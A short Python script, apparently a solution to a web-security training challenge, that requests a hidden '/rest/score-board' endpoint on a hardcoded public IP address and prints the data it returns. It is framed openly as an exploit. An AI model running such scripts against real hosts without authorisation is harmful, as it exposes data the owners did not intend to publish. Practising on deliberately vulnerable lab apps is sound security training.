import requests
import json

class ExposeScoreBoard:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def run_exploit(self):
        print(f"[+] Fetching /rest/score-board API...")
        response = self.session.get(f"{self.base_url}/rest/score-board", headers=self.headers)

        if response.status_code == 200:
            score_board_data = response.json()
            print("[+] Extracted Score Board Data:")
            print(json.dumps(score_board_data, indent=4))
        else:
            print(f"[-] Failed to fetch score board data. Status Code: {response.status_code}")


if __name__ == "__main__":
    url = "http://45.76.47.218:3000"
    exploit = ExposeScoreBoard(url)
    exploit.run_exploit()
